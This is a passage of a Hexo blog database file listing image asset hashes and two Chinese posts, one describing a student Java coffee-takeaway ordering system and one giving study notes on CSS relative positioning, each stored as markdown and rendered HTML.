0f7945dac","modified":1458131263000},{"_id":"source/assets/2016-03-16-css-line-height/3.png","hash":"eae5d4b1f98485c661453ec1ea39cdaadc4eabee","modified":1458128170000},{"_id":"source/assets/2016-03-16-css-line-height/4.png","hash":"243c7480ff2790250123337ad42ddb382a7891d2","modified":1458117287000},{"_id":"source/assets/2016-03-16-css-line-height/9.png","hash":"cbfccf25f796357180722f8413a7285e901ea245","modified":1458119678000},{"_id":"source/assets/2016-03-16-css-line-height/8.png","hash":"a79f13c6a2a232fcf65c30a92c37dc058f090f7a","modified":1458118804000},{"_id":"source/assets/2016-02-21-oauth/1.png","hash":"62c97fb446a237ce24fae61ae0325a6ab0a0c615","modified":1456071662000},{"_id":"source/assets/2016-03-02-talk-http/3.png","hash":"d627eb0c5795b8b50693f2c866c860dfa90bd248","modified":1456906929000},{"_id":"source/assets/2016-03-02-talk-http/6.png","hash":"206288d380ebbe6bf3e47c856fd9913f8dbaa78a","modified":1456911639000},{"_id":"source/assets/2016-03-16-css-line-height/6.png","hash":"003fcdd148ef288815333115760c3f0ae54f5952","modified":1458117917000},{"_id":"source/assets/2016-03-16-css-line-height/7.png","hash":"fac7f300e4c9cbe25ed7a8629d0ef122ca7624a3","modified":1458118033000},{"_id":"source/assets/2016-03-16-css-line-height/5.png","hash":"0950c3c801f7070cf7dc6f5e37948843378434bf","modified":1458117577000},{"_id":"source/assets/2016-02-29-ajax-cross-origin/1.png","hash":"2e1e569949e4d3bd87f82326ab935c9563d524a4","modified":1456831431000},{"_id":"source/assets/2016-02-29-ajax-cross-origin/2.png","hash":"b0462cefbc1c9cd42cdcd217917c61f02afd3d67","modified":1456797262000},{"_id":"source/assets/2016-02-29-ajax-cross-origin/3.png","hash":"317fd2297d603a66d2027f32ac8295e38695d9f6","modified":1456799985000},{"_id":"source/assets/2016-02-29-ajax-cross-origin/4.png","hash":"3be8d88c90ac290247d6b0b363388e3fd2d97d9d","modified":1456800036000},{"_id":"source/assets/2016-02-29-ajax-cross-origin/5.png","hash":"84c9fa02308f38546af8c4b882686a2695318dcc","modified":1450956956000},{"_id":"source/assets/2016-03-01-ajax-baidu-search/1.png","hash":"2e1e569949e4d3bd87f82326ab935c9563d524a4","modified":1456831431000},{"_id":"source/assets/2016-03-01-ajax-baidu-search/2.png","hash":"d69ae7ba01b39cdda09d89242ae2b9f3883c4cc2","modified":1456832151000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/1.jpg","hash":"6d81d1af9de2f278a462703388b9bccf27a85914","modified":1457869651000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/1.png","hash":"8d02041b453433e6320b0bf9696cc5dad4a99e77","modified":1457876436000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/10.png","hash":"beaf3643f02b6c1ff75ef8137d6b223e5c47143f","modified":1457876616000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/11.png","hash":"a0944e58130e06fd3dcf10a776ceac036d026266","modified":1457876632000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/12.png","hash":"f1fa950c23e69c270de8d87dc1792ebab8a0ea77","modified":1457876647000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/13.png","hash":"95b8a8055a48e5fa3b5b452ebadb315413389260","modified":1457873629000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/14.png","hash":"def0915fc4ee9d65a462a7e83ef444b9d0e4dea6","modified":1457873265000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/16.png","hash":"3eb8af71ae6e49edd8b89226031e8ee31828313c","modified":1457873322000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/17.png","hash":"9906d05d92b22b3011fb294b79387f8a5299b084","modified":1457873377000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/18.png","hash":"4e0e6a118fa31baa05075212c1316b95e4282222","modified":1457874536000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/19.png","hash":"e2f4a6ff99559d8a69690e8a2c73156a5c79ab45","modified":1457875287000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/2.jpg","hash":"1ecaac9b18d66edf3ab7aeaadde91dd7b47ac4f5","modified":1457870409000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/2.png","hash":"fe6f76c514899303d2d51cffce0e5d4b35dba1d8","modified":1457876448000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/20.png","hash":"9d92026081a6504e80c9db5f9428364651b96d02","modified":1457875613000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/3.png","hash":"af220f55a73378daa5276d34720acd6eb92d39df","modified":1457876407000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/4.png","hash":"acc7ad4de2c21cfaca0850680f241cf394d695a6","modified":1457876426000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/5.png","hash":"d2a7c955fa9e03967df35cfc1600eaa437d33cf4","modified":1457876493000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/6.png","hash":"515b0df5104e9d9eb31ef464ac15b8397a75d9ef","modified":1457876530000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/15.png","hash":"e89526a5786b49cb3f0562d0130c6759d24aefde","modified":1457873307000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/7.png","hash":"95d60cc87aed2f0de125a8d1fb371b8a056f0463","modified":1457876550000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/8.png","hash":"40e4a1e6a1695cb3714f1b53330e7826b74d6657","modified":1457876583000},{"_id":"source/assets/2016-03-13-learn-css-flexbox/9.png","hash":"3a1f41ded99ee222549abf0333d29d5b5cfa0049","modified":1457876599000},{"_id":"source/assets/2016-03-21-rounter-knowledge/2.png","hash":"d926af6c540509b6b7e69b7f6e5418fa03335bac","modified":1449763653000},{"_id":"source/assets/2016-03-21-rounter-knowledge/4.png","hash":"0e57456866cabc815a06046a63c0bac267d0ca0f","modified":1449763687000},{"_id":"source/assets/2016-03-09-web-security/1.jpg","hash":"f5a8dc04304bf47b66a2a1486dcec6f1713e31bc","modified":1457441929000},{"_id":"source/assets/2016-03-01-ajax-baidu-search/4.png","hash":"47f2295c93075dd4c030c9d3f064954ed4e8ce1b","modified":1456834856000},{"_id":"source/assets/2016-03-01-ajax-baidu-search/5.png","hash":"2a0699ee41ad0ddcd838db353436e60651aba74e","modified":1456834868000},{"_id":"source/assets/2016-03-21-rounter-knowledge/1.png","hash":"ce9f540086f1581d4363ae571524f9e0ee535da8","modified":1449763640000},{"_id":"source/assets/2016-03-21-rounter-knowledge/3.png","hash":"44fc7696b701b65eaf9693308b9f452053774d84","modified":1449763504000},{"_id":"source/assets/2016-03-21-rounter-knowledge/5.png","hash":"799085d84533af0b18f3b6c6bd614b7c91b361c3","modified":1449763669000},{"_id":"source/assets/2016-03-21-rounter-knowledge/6.png","hash":"b7b9bd4d1b9ebf8b1690c99db61e3597bc40c772","modified":1449763677000},{"_id":"source/assets/2016-03-02-talk-http/1.png","hash":"46292b393f393b623524bd19206c98e59346b120","modified":1456891181000},{"_id":"source/assets/2016-03-16-css-line-height/10.png","hash":"c32a13f9d534124772be1d313c84bfabf064ca04","modified":1458129044000},{"_id":"source/assets/2016-03-16-css-line-height/11.png","hash":"a7d64f2522f319e5e290eecd94a43663f969a668","modified":1458129191000},{"_id":"source/assets/2016-03-16-css-line-height/12.png","hash":"0476895ac710627f99e3aae3603497fdfc083a9f","modified":1458130489000},{"_id":"source/assets/2016-03-21-rounter-knowledge/7.png","hash":"a02fd429f2e4ec71c8a151d6814b2e23d2f91d3d","modified":1449763614000},{"_id":"source/assets/2016-03-01-ajax-baidu-search/3.png","hash":"5678b32fbf63b8ae0e2706786d695fae7d010b86","modified":1456833422000},{"_id":"source/assets/2016-02-21-oauth/2.png","hash":"c5cdf016807653eb46bf3e589bec8e087421aeea","modified":1456072489000},{"_id":"source/assets/2016-02-19-record-front-questions/1.png","hash":"3348f32eea21c32076c8a397e24f0e5fcc44b481","modified":1456029096000},{"_id":"source/assets/2016-02-23-record-front-questions/1.png","hash":"3f9aad5d98b5ecd584c28a49f334b4c417d22016","modified":1456296993000},{"_id":"source/assets/2016-02-20-javascript-execution-context/1.png","hash":"da590d74037d000ab1d8ca475fd7fa2193936b99","modified":1456043210000}],"Category":[],"Data":[],"Page":[],"Post":[{"layout":"post","title":"「实验 · 设计」外卖系统设计 Suncafe","date":"2015-10-16T04:00:00.000Z","author":"Lindz","header-img":"img/1.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 外卖系统设计 Suncafe  \n一开始老师叫我们写一个基于JAVA跟咖啡有关的系统，我便想起我们食堂内的咖啡厅，夏天到来时许多同学都会选择到咖啡厅喝喝咖啡，要是能够开发一个类似外卖的系统，同学在宿舍想喝咖啡的就能够派上用场了。基于这个想法，我花了差不多一周的时间进行实现并参加班级答辩。  \n\n运行环境: Eclipse\n\n涉及技术（Java）：\n\n* 使用Swing包和windowbuilder进行UI界面的设计\n* 使用Socket包进行简单的局域网通讯\n* 使用JDOM2、DOM解析和读入XML文件，并使用XML存储信息\n* 使用正则表达式对用户输入进行判断  \n\n客户端实现功能：\n\n* 输入手机号进行验证，通过可进入客户端下订单。\n* 商品(咖啡、奶茶)以及所有属性的展示。\n* 用户可根据需要将商品放入购物车中。\n* 用户可根据实际需要跟卖家进行沟通。\n* 用户成功下订单并获得订单信息。 \n\n服务端实现功能：\n\n* 卖家通过帐号密码登陆服务平台。\n* 能够实时更新用户订单，并进行订单配送。\n* 构建本地服务器，能够跟用户进行通讯。\n* 能够察看用户订单的详细内容。\n\n#### 源码: [GourmetCoffee](https://github.com/happylindz/TakeawaySystem-design/)\n\n#### 如果有任何不明白的地方，欢迎向我发issue。  \n\n### 截图： \n\n用户通过输入手机号和验证码登陆\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/1.png) \n\n\n用户可根据左边的菜单信息挑选商品\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/2.png)\n\n用户确认购物车信息并填入个人信息\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/3.png)\n\n用户有需求可与卖家通讯\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/4.png)\n\n确认订单 打印订单信息\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/5.png)\n\n管理员登陆界面\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/6.png)\n\n\n","source":"_posts/2015-10-26-suncafe.md","raw":"---\nlayout:     post\ntitle:      \"「实验 · 设计」外卖系统设计 Suncafe\"\ndate:       2015-10-16 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/1.jpg\"\ntags:\n    - Java\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 外卖系统设计 Suncafe  \n一开始老师叫我们写一个基于JAVA跟咖啡有关的系统，我便想起我们食堂内的咖啡厅，夏天到来时许多同学都会选择到咖啡厅喝喝咖啡，要是能够开发一个类似外卖的系统，同学在宿舍想喝咖啡的就能够派上用场了。基于这个想法，我花了差不多一周的时间进行实现并参加班级答辩。  \n\n运行环境: Eclipse\n\n涉及技术（Java）：\n\n* 使用Swing包和windowbuilder进行UI界面的设计\n* 使用Socket包进行简单的局域网通讯\n* 使用JDOM2、DOM解析和读入XML文件，并使用XML存储信息\n* 使用正则表达式对用户输入进行判断  \n\n客户端实现功能：\n\n* 输入手机号进行验证，通过可进入客户端下订单。\n* 商品(咖啡、奶茶)以及所有属性的展示。\n* 用户可根据需要将商品放入购物车中。\n* 用户可根据实际需要跟卖家进行沟通。\n* 用户成功下订单并获得订单信息。 \n\n服务端实现功能：\n\n* 卖家通过帐号密码登陆服务平台。\n* 能够实时更新用户订单，并进行订单配送。\n* 构建本地服务器，能够跟用户进行通讯。\n* 能够察看用户订单的详细内容。\n\n#### 源码: [GourmetCoffee](https://github.com/happylindz/TakeawaySystem-design/)\n\n#### 如果有任何不明白的地方，欢迎向我发issue。  \n\n### 截图： \n\n用户通过输入手机号和验证码登陆\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/1.png) \n\n\n用户可根据左边的菜单信息挑选商品\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/2.png)\n\n用户确认购物车信息并填入个人信息\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/3.png)\n\n用户有需求可与卖家通讯\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/4.png)\n\n确认订单 打印订单信息\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/5.png)\n\n管理员登陆界面\n![img](https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/6.png)\n\n\n","slug":"2015-10-26-suncafe","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rw50000xmvdcamxyfry","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"外卖系统设计-Suncafe\"><a href=\"#外卖系统设计-Suncafe\" class=\"headerlink\" title=\"外卖系统设计 Suncafe\"></a>外卖系统设计 Suncafe</h2><p>一开始老师叫我们写一个基于JAVA跟咖啡有关的系统，我便想起我们食堂内的咖啡厅，夏天到来时许多同学都会选择到咖啡厅喝喝咖啡，要是能够开发一个类似外卖的系统，同学在宿舍想喝咖啡的就能够派上用场了。基于这个想法，我花了差不多一周的时间进行实现并参加班级答辩。  </p>\n<p>运行环境: Eclipse</p>\n<p>涉及技术（Java）：</p>\n<ul>\n<li>使用Swing包和windowbuilder进行UI界面的设计</li>\n<li>使用Socket包进行简单的局域网通讯</li>\n<li>使用JDOM2、DOM解析和读入XML文件，并使用XML存储信息</li>\n<li>使用正则表达式对用户输入进行判断  </li>\n</ul>\n<p>客户端实现功能：</p>\n<ul>\n<li>输入手机号进行验证，通过可进入客户端下订单。</li>\n<li>商品(咖啡、奶茶)以及所有属性的展示。</li>\n<li>用户可根据需要将商品放入购物车中。</li>\n<li>用户可根据实际需要跟卖家进行沟通。</li>\n<li>用户成功下订单并获得订单信息。 </li>\n</ul>\n<p>服务端实现功能：</p>\n<ul>\n<li>卖家通过帐号密码登陆服务平台。</li>\n<li>能够实时更新用户订单，并进行订单配送。</li>\n<li>构建本地服务器，能够跟用户进行通讯。</li>\n<li>能够察看用户订单的详细内容。</li>\n</ul>\n<h4 id=\"源码-GourmetCoffee\"><a href=\"#源码-GourmetCoffee\" class=\"headerlink\" title=\"源码: GourmetCoffee\"></a>源码: <a href=\"https://github.com/happylindz/TakeawaySystem-design/\" target=\"_blank\" rel=\"external\">GourmetCoffee</a></h4><h4 id=\"如果有任何不明白的地方，欢迎向我发issue。\"><a href=\"#如果有任何不明白的地方，欢迎向我发issue。\" class=\"headerlink\" title=\"如果有任何不明白的地方，欢迎向我发issue。\"></a>如果有任何不明白的地方，欢迎向我发issue。</h4><h3 id=\"截图：\"><a href=\"#截图：\" class=\"headerlink\" title=\"截图：\"></a>截图：</h3><p>用户通过输入手机号和验证码登陆<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/1.png\" alt=\"img\"> </p>\n<p>用户可根据左边的菜单信息挑选商品<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/2.png\" alt=\"img\"></p>\n<p>用户确认购物车信息并填入个人信息<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/3.png\" alt=\"img\"></p>\n<p>用户有需求可与卖家通讯<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/4.png\" alt=\"img\"></p>\n<p>确认订单 打印订单信息<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/5.png\" alt=\"img\"></p>\n<p>管理员登陆界面<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/6.png\" alt=\"img\"></p>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"外卖系统设计-Suncafe\"><a href=\"#外卖系统设计-Suncafe\" class=\"headerlink\" title=\"外卖系统设计 Suncafe\"></a>外卖系统设计 Suncafe</h2><p>一开始老师叫我们写一个基于JAVA跟咖啡有关的系统，我便想起我们食堂内的咖啡厅，夏天到来时许多同学都会选择到咖啡厅喝喝咖啡，要是能够开发一个类似外卖的系统，同学在宿舍想喝咖啡的就能够派上用场了。基于这个想法，我花了差不多一周的时间进行实现并参加班级答辩。  </p>\n<p>运行环境: Eclipse</p>\n<p>涉及技术（Java）：</p>\n<ul>\n<li>使用Swing包和windowbuilder进行UI界面的设计</li>\n<li>使用Socket包进行简单的局域网通讯</li>\n<li>使用JDOM2、DOM解析和读入XML文件，并使用XML存储信息</li>\n<li>使用正则表达式对用户输入进行判断  </li>\n</ul>\n<p>客户端实现功能：</p>\n<ul>\n<li>输入手机号进行验证，通过可进入客户端下订单。</li>\n<li>商品(咖啡、奶茶)以及所有属性的展示。</li>\n<li>用户可根据需要将商品放入购物车中。</li>\n<li>用户可根据实际需要跟卖家进行沟通。</li>\n<li>用户成功下订单并获得订单信息。 </li>\n</ul>\n<p>服务端实现功能：</p>\n<ul>\n<li>卖家通过帐号密码登陆服务平台。</li>\n<li>能够实时更新用户订单，并进行订单配送。</li>\n<li>构建本地服务器，能够跟用户进行通讯。</li>\n<li>能够察看用户订单的详细内容。</li>\n</ul>\n<h4 id=\"源码-GourmetCoffee\"><a href=\"#源码-GourmetCoffee\" class=\"headerlink\" title=\"源码: GourmetCoffee\"></a>源码: <a href=\"https://github.com/happylindz/TakeawaySystem-design/\">GourmetCoffee</a></h4><h4 id=\"如果有任何不明白的地方，欢迎向我发issue。\"><a href=\"#如果有任何不明白的地方，欢迎向我发issue。\" class=\"headerlink\" title=\"如果有任何不明白的地方，欢迎向我发issue。\"></a>如果有任何不明白的地方，欢迎向我发issue。</h4><h3 id=\"截图：\"><a href=\"#截图：\" class=\"headerlink\" title=\"截图：\"></a>截图：</h3><p>用户通过输入手机号和验证码登陆<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/1.png\" alt=\"img\"> </p>\n<p>用户可根据左边的菜单信息挑选商品<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/2.png\" alt=\"img\"></p>\n<p>用户确认购物车信息并填入个人信息<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/3.png\" alt=\"img\"></p>\n<p>用户有需求可与卖家通讯<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/4.png\" alt=\"img\"></p>\n<p>确认订单 打印订单信息<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/5.png\" alt=\"img\"></p>\n<p>管理员登陆界面<br><img src=\"https://raw.githubusercontent.com/happylindz/TakeawaySystem-design/master/ShotScreen/6.png\" alt=\"img\"></p>\n"},{"layout":"post","title":"「学习 · 笔记」CSS之relative","date":"2016-01-28T04:00:00.000Z","author":"Lindz","header-img":"img/2.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## relative与absolute：\n  \n* 限制left/top/right/bottom定位:\n\n> absolute绝对定位是相对于非static值的父元素  \n\n* 限制z-index层级:\n\ncode：  \n\n```css   \n.div1{    \n\tposition:absolute;    \n\tz-index:1;\n}  \n\n.div2{\n\tposition:absolute;\n\tz-index:2;\n}\n```   \n此时div2层级比div1高，优先显示.  \n然而:  \n\n```css  \n//less\n.parent1{     \n\tposition:relative;\n\tz-index:2;\n\t.child1{\n\t\tpostion:absolute;\n\t\tz-index:1;\n\t}\n}\n\n.parent2{     \n\tposition:relative;\n\tz-index:1;\n\t.child2{\n\t\tpostion:absolute;\n\t\tz-index:2;\n\t}\n}\n```\n此时尽管child1的z-index比child2小，但是child1依然在child2上面.\n\n* 限制在overflow下:  \n\ncode:  \n\n```css\n.parent{\n\toverflow:hidden;\n\t.child{\n\t\tposition:absolute;\n\t}\n}\n``` \n若子元素超出父元素部分，overflow并不会对其进行限制；\n\n```css\n.parent{\n\toverflow:hidden;\n\tposition:relative;\n\t.child{\n\t\tposition:absolute;\n\t}\n}\n```\n此时若子元素超出父元素部分，因为overflow子元素超出部分将被隐藏； \n\n## relative与fixed： \n  \n> relative只能限制z-index，对上述其他属性不起作用。  \n\n## relative与定位:\n\n### 特性：\n\n* 相对自身：\n\n> 与absolute(相对于非static值的父元素定位)不同，relative相对于其原本位置进行定位。   \n\n* 无侵入: \t \n\nmargin-top与top进行对比   \ncode：\t\n\n```css\ndiv1{\n\tposition: relative;\n\tmargin-top: -100px;\n}\n\ndiv2{\n\tposition: relative;\n\ttop: -100px;\n}\n\n```\n\n> 此时在div1后面的元素会随着div1的变动也随之改变位置，而div2后面的元素并不会改变位置。 \n\n注：若top/bottom和left/right对立属性同时存在时的表现：  \ntop起作用而bottom不起作用；  \nleft起作用而right不起作用。  \n\n## relative与层级关系：\n\n### 提高层叠上下文：  \n\n> 在层叠底部的元素添加relative属性值可将该元素置顶。\n\n## relative的最小化影响原则：\n\n即尽量降低relative属性对其他元素或布局的潜在影响。 \n\n#### 1. 尽量避免使用relative：\n\n> 即避免使用relative属性的父元素来限制使用absolute属性的子元素。  \n\n#### 2. relative最小化：\ncode:\n\n```html\n<div style=\"postion:relative;\">\n\t<div style=\"position:absolute;top:0;right:0;\"></div>\n\t<div></div>\n\t<div></div>\n\t<div></div>\n</div>\n```\n可改为： \n\n```html\n<div style=\"postion:relative;\">\n\t<div style=\"position:absolute;top:0;right:0;\"></div>\n</div>\n<div>\n\t<div></div>\n\t<div></div>\n\t<div></div>\n</div>\n\n```\n> 这样可避免因为relative带来的子元素div层级关系的问题。\n\n\n \n\n\n\n","source":"_posts/2016-01-28-css-learning-relative.md","raw":"---\nlayout:     post\ntitle:      \"「学习 · 笔记」CSS之relative\"\ndate:       2016-01-28 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/2.jpg\"\ntags:\n    - CSS\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## relative与absolute：\n  \n* 限制left/top/right/bottom定位:\n\n> absolute绝对定位是相对于非static值的父元素  \n\n* 限制z-index层级:\n\ncode：  \n\n```css   \n.div1{    \n\tposition:absolute;    \n\tz-index:1;\n}  \n\n.div2{\n\tposition:absolute;\n\tz-index:2;\n}\n```   \n此时div2层级比div1高，优先显示.  \n然而:  \n\n```css  \n//less\n.parent1{     \n\tposition:relative;\n\tz-index:2;\n\t.child1{\n\t\tpostion:absolute;\n\t\tz-index:1;\n\t}\n}\n\n.parent2{     \n\tposition:relative;\n\tz-index:1;\n\t.child2{\n\t\tpostion:absolute;\n\t\tz-index:2;\n\t}\n}\n```\n此时尽管child1的z-index比child2小，但是child1依然在child2上面.\n\n* 限制在overflow下:  \n\ncode:  \n\n```css\n.parent{\n\toverflow:hidden;\n\t.child{\n\t\tposition:absolute;\n\t}\n}\n``` \n若子元素超出父元素部分，overflow并不会对其进行限制；\n\n```css\n.parent{\n\toverflow:hidden;\n\tposition:relative;\n\t.child{\n\t\tposition:absolute;\n\t}\n}\n```\n此时若子元素超出父元素部分，因为overflow子元素超出部分将被隐藏； \n\n## relative与fixed： \n  \n> relative只能限制z-index，对上述其他属性不起作用。  \n\n## relative与定位:\n\n### 特性：\n\n* 相对自身：\n\n> 与absolute(相对于非static值的父元素定位)不同，relative相对于其原本位置进行定位。   \n\n* 无侵入: \t \n\nmargin-top与top进行对比   \ncode：\t\n\n```css\ndiv1{\n\tposition: relative;\n\tmargin-top: -100px;\n}\n\ndiv2{\n\tposition: relative;\n\ttop: -100px;\n}\n\n```\n\n> 此时在div1后面的元素会随着div1的变动也随之改变位置，而div2后面的元素并不会改变位置。 \n\n注：若top/bottom和left/right对立属性同时存在时的表现：  \ntop起作用而bottom不起作用；  \nleft起作用而right不起作用。  \n\n## relative与层级关系：\n\n### 提高层叠上下文：  \n\n> 在层叠底部的元素添加relative属性值可将该元素置顶。\n\n## relative的最小化影响原则：\n\n即尽量降低relative属性对其他元素或布局的潜在影响。 \n\n#### 1. 尽量避免使用relative：\n\n> 即避免使用relative属性的父元素来限制使用absolute属性的子元素。  \n\n#### 2. relative最小化：\ncode:\n\n```html\n<div style=\"postion:relative;\">\n\t<div style=\"position:absolute;top:0;right:0;\"></div>\n\t<div></div>\n\t<div></div>\n\t<div></div>\n</div>\n```\n可改为： \n\n```html\n<div style=\"postion:relative;\">\n\t<div style=\"position:absolute;top:0;right:0;\"></div>\n</div>\n<div>\n\t<div></div>\n\t<div></div>\n\t<div></div>\n</div>\n\n```\n> 这样可避免因为relative带来的子元素div层级关系的问题。\n\n\n \n\n\n\n","slug":"2016-01-28-css-learning-relative","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rwd0001xmvdnwq9ookq","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"relative与absolute：\"><a href=\"#relative与absolute：\" class=\"headerlink\" title=\"relative与absolute：\"></a>relative与absolute：</h2><ul>\n<li>限制left/top/right/bottom定位:</li>\n</ul>\n<blockquote>\n<p>absolute绝对定位是相对于非static值的父元素  </p>\n</blockquote>\n<ul>\n<li>限制z-index层级:</li>\n</ul>\n<p>code：  </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.div1&#123;    </span><br><span class=\"line\">\tposition:absolute;    </span><br><span class=\"line\">\tz-index:1;</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\">.div2&#123;</span><br><span class=\"line\">\tposition:absolute;</span><br><span class=\"line\">\tz-index:2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```   </span><br><span class=\"line\">此时div2层级比div1高，优先显示.  </span><br><span class=\"line\">然而:  </span><br><span class=\"line\"></span><br><span class=\"line\">```css  </span><br><span class=\"line\">//less</span><br><span class=\"line\">.parent1&#123;     </span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\tz-index:2;</span><br><span class=\"line\">\t.child1&#123;</span><br><span class=\"line\">\t\tpostion:absolute;</span><br><span class=\"line\">\t\tz-index:1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">.parent2&#123;     </span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\tz-index:1;</span><br><span class=\"line\">\t.child2&#123;</span><br><span class=\"line\">\t\tpostion:absolute;</span><br><span class=\"line\">\t\tz-index:2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时尽管child1的z-index比child2小，但是child1依然在child2上面.</p>\n<ul>\n<li>限制在overflow下:  </li>\n</ul>\n<p>code:  </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;</span><br><span class=\"line\">\toverflow:hidden;</span><br><span class=\"line\">\t.child&#123;</span><br><span class=\"line\">\t\tposition:absolute;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\">若子元素超出父元素部分，overflow并不会对其进行限制；</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">.parent&#123;</span><br><span class=\"line\">\toverflow:hidden;</span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\t.child&#123;</span><br><span class=\"line\">\t\tposition:absolute;</span><br><span 